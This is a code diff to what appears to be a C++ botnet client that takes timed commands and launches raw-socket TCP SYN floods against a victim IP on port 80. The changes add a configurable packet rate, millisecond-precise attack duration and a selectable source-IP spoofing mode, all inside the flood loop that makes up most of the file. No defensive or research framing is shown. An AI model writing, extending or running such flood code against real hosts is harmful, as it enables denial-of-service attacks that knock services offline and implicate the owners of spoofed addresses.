@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <iostream>
 #include <string.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <math.h>
 #include <sys/types.h>
@@ -19,8 +20,6 @@
 
 using namespace std;
 
-#define RANDOM_SPOOFING 1
-
 static unsigned int seed = 0xA0000000;
 
 static int botNo;
@@ -29,8 +28,8 @@ static int offset;
 
 unsigned short csum(unsigned short *,int);
 void parseCommand(char []);
-void ipSpoofing(string &sourceIP, int &sourcePort);
-void synAttack(string, int, string, int, int);
+void ipSpoofing(string &sourceIP, int &sourcePort, int spoofMethod);
+void synAttack(string, int, string, int, int, int, int);
 
 void getOffset(){
   double foffset;
@@ -102,9 +101,21 @@ void waitUntilTargettime(char* time){
     usleep(wait_usec);
 }
 
-int timeDur(char* ch)
+int parseFourDigit(char* ch)
 {
     return ((ch[0]-'0')*1000 + (ch[1]-'0')*100 + (ch[2]-'0')*10 + (ch[3]-'0'));
+}
+
+void increaseTime(timeval & t, long delta)
+{
+    long temp = t.tv_usec + delta;
+    if (temp < 1000000)
+        t.tv_usec = temp;
+    else
+    {
+        t.tv_usec = temp % 1000000;
+        t.tv_sec = t.tv_sec + temp / 1000000;
+    }
 }
 
 int main(void)
@@ -171,7 +182,7 @@ void parseCommand(char command[])
     else if (command[0] == '2')
     {
     	srand(time(NULL));    // For random IP spoofing;
-        int attackNum = (strlen(command) - 15) / 19;
+        int attackNum = (strlen(command) - 15) / 24;
         for (int i = 0; i < attackNum; i++)
         {
 	        struct hostent *hostinfo = NULL; //Host name
@@ -184,7 +195,9 @@ void parseCommand(char command[])
 	        
 	        string ss="";
 	        int port = 0;
-	        synAttack(ss, port, victim_ip, 80, timeDur(command+15+15+i*19));
+	        int attackDur = parseFourDigit(command+15+15+i*24);
+            	int attackRate = parseFourDigit(command+15+15+4+i*24);
+	        synAttack(ss, port, victim_ip, 80, attackDur, attackRate, command[15+15+4+4+i*24]-'0');
 	        //synAttack("192.168.1.2", 22000, victim_ip, 80, 3);
 	        cout << "Done" << endl;
     }
@@ -219,7 +232,8 @@ unsigned short csum(unsigned short *ptr,int nbytes)
     return(answer);
 }
 
-void synAttack(string sourceIP, int sourcePort, string destIP, int destPort, int durTime)
+void synAttack(string sourceIP, int sourcePort, string destIP, int destPort,
+                int durTime, int rate, int ipSpoofMethod)
 {
 	// Create a raw socket;
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -253,11 +267,17 @@ void synAttack(string sourceIP, int sourcePort, string destIP, int destPort, int
     strcpy(data, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
 
     // SYN Floor with IP Spoofing;
-    time_t timeBegin = time(NULL);
+    int packetNum = 0;
+    long OnePacketTime = 1000000/rate;
+    struct timeval timeBegin, timeEnd, timeEndP;
+    long timeInterval;
+    gettimeofday(&timeEndP, NULL);
+    increaseTime(timeEndP, OnePacketTime);
+    gettimeofday(&timeBegin, NULL);
     while(1)
     {
         // IP spoofing;
-        ipSpoofing(sourceIP, sourcePort);
+        ipSpoofing(sourceIP, sourcePort, ipSpoofMethod);
 
         // Some address resoluition;
         strcpy(source_ip, sourceIP.c_str());  // Source IP
@@ -331,18 +351,38 @@ void synAttack(string sourceIP, int sourcePort, string destIP, int destPort, int
         else
         {
         	cout << "Packet sent! Length : " << iph->tot_len;
-            cout << " Source IP: " << sourceIP << " Port: " << sourcePort << endl;
+            	cout << " Source IP: " << sourceIP << " Port: " << sourcePort << endl;
+            	packetNum++;
         }
 
-        if (time(NULL) - timeBegin > durTime)
+        // Control the attack duration;
+        gettimeofday(&timeEnd, NULL);
+        timeInterval = (timeEnd.tv_sec - timeBegin.tv_sec) * 1000
+                        + (timeEnd.tv_usec - timeBegin.tv_usec) / 1000;  // Precision to ms;
+        if (timeInterval >= durTime*1000)
             break;
-    }
 
+        // Control the attack rate;
+        while(1)
+        {
+            gettimeofday(&timeEnd, NULL);
+            if (timeEnd.tv_sec > timeEndP.tv_sec)
+                break;
+            else if (timeEnd.tv_sec == timeEndP.tv_sec && timeEnd.tv_usec >= timeEndP.tv_usec)
+                break;
+        }
+        increaseTime(timeEndP, OnePacketTime);
+    }
+    cout << "Number of sent packets is: " << packetNum;
+    cout << "  Dur: " << durTime*1000 << "ms  Real Dur: " << timeInterval << "ms" << endl;
     close(s);
 }
 
-void ipSpoofing(string & sourceIP, int & sourcePort)
+void ipSpoofing(string & sourceIP, int & sourcePort, int spoofMethod)
 {
+    if (spoofMethod == 0)
+        return;
+        
     int p1;
     int p2;
     int p3;
@@ -352,7 +392,7 @@ void ipSpoofing(string & sourceIP, int & sourcePort)
     char str3[5];
     char str4[5];
 
-    if (RANDOM_SPOOFING==0)
+    if (spoofMethod == 1)
     {
         seed+=4;
         p1=seed&0xFF;
